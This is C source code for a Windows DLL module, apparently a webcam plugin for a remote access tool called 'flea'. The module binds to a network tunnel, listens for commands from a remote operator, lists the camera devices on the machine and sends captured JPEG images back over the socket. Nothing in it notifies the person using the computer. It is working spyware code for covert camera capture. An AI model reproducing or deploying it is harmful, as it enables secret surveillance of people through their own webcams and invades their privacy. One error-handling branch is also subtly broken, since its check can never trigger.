#include "kernel/flea.h"
#include "kernel/list.h"
#include "webcam.h"
#include "../protocol.h"
#include "protocol/common.h"
#include <winsock2.h>

#define TUNNEL 4

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch( fdwReason ) { 
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

INT CmdListDevice(LPFLEA fl, SOCKET sock)
{
	DWORD dwRet = 0;
	struct msg_ret_code ret = { MSG_EOK };

	LINK list;
        if (WebcamListDevice(fl->hHeap, &list)) {
		ret.error_code = WEBCAM_ELISTDEVICE;
		if (FleaSyncSend(fl, sock, &ret, sizeof ret)) 
			dwRet = -1;
		goto out;
	}
	if (FleaSyncSend(fl, sock, &ret, sizeof ret)) {
		dwRet = -1;
		goto out;
	}

        while (!ListIsEmpty(&list)) {
                LPWEBCAM_NAME pCamName = ListFirstEntry(&list, WEBCAM_NAME, link);;
		LPSTR pNameUtf8 = FleaConvUtf16ToUtf8(fl, pCamName->wzName);
		// TODO check null
		BYTE byNameSize = lstrlenA(pNameUtf8) + 1;

		if (FleaSyncSend(fl, sock, &byNameSize, sizeof byNameSize))  {
			dwRet = -1;
			HeapFree(fl->hHeap, 0, pNameUtf8);
			goto out;
		}
		if (FleaSyncSend(fl, sock, pNameUtf8, byNameSize))  {
			dwRet = -1;
			HeapFree(fl->hHeap, 0, pNameUtf8);
			goto out;
		}

		HeapFree(fl->hHeap, 0, pNameUtf8);
                ListDel(&pCamName->link);
                HeapFree(fl->hHeap, 0, pCamName);
        }
	BYTE byZeroSize = 0;
	if (FleaSyncSend(fl, sock, &byZeroSize, sizeof byZeroSize))  {
		dwRet = -1;
		goto out;
	}
out:
	return dwRet;
}

INT CmdWebcamCapture(LPFLEA fl, SOCKET sock)
{
	DWORD dwRet = -1;
	struct msg_ret_code ret = { MSG_EOK };
	LPWEBCAM pCam = NULL;
	HGLOBAL hMem = INVALID_HANDLE_VALUE;


	BYTE byDevice;
	if (FleaSyncRecv(fl, sock, &byDevice, sizeof byDevice))
		goto out;

	pCam = WebcamOpen(fl->hHeap, byDevice);
	if (!pCam) {
		ret.error_code = WEBCAM_EOPENDEVICE;
		FleaSyncSend(fl, sock, &ret, sizeof ret);
		goto out;
	}

	hMem = GlobalAlloc(GMEM_MOVEABLE, 0);

	Sleep(1000);

	if (WebcamCaptureJpeg(pCam, hMem)) {
		if (!pCam) {
			ret.error_code = WEBCAM_ECAPTURE;
			FleaSyncSend(fl, sock, &ret, sizeof ret);
			goto out;
		}
	}

	if (FleaSyncSend(fl, sock, &ret, sizeof ret))
		goto out;

	DWORD dwFileSize = GlobalSize(hMem);;

	if (FleaSyncSend(fl, sock, &dwFileSize, sizeof dwFileSize))
		goto out;

	LPVOID pBuffer = GlobalLock(hMem);
	if (FleaSyncSend(fl, sock, pBuffer, dwFileSize))
		goto out;
	GlobalUnlock(hMem);
	dwRet = 0;

out:
	if (pCam)
		WebcamClose(pCam);
	if (hMem != INVALID_HANDLE_VALUE)
		GlobalFree(hMem);
	return dwRet;
}

INT Initialize(LPFLEA fl, INT iModIndex)
{
	INT iRetVal = -1;
	PCALLTABLE ct = &fl->call;
	int index = -1;

	if (WebcamInitialize())
		return -1;

	index = ct->TunnelBind(fl, iModIndex, TUNNEL);
	if (index == -1)
		goto out;
	SOCKET sock = FleaGetTunnelSocket(fl, index);
	BYTE byID;

	while (1) {
		if (FleaSyncRecv(fl, sock, &byID, sizeof byID))
			goto out;
		switch (byID) {
			case WEBCAM_MSG_CAPTURE:
				if (CmdWebcamCapture(fl, sock))
					goto out;
				break;
			case WEBCAM_MSG_LIST_DEVICE:
				if (CmdListDevice(fl, sock))
					goto out;
				break;
		}
	}
	
	iRetVal = 0;
out:
	if (index != -1)
		FleaTunnelClose(fl, index);
	WebcamUninitialize();
	return iRetVal;
}

void Interrupt(LPFLEA d, INT iModIndex)
{

}

void foo()
{
}
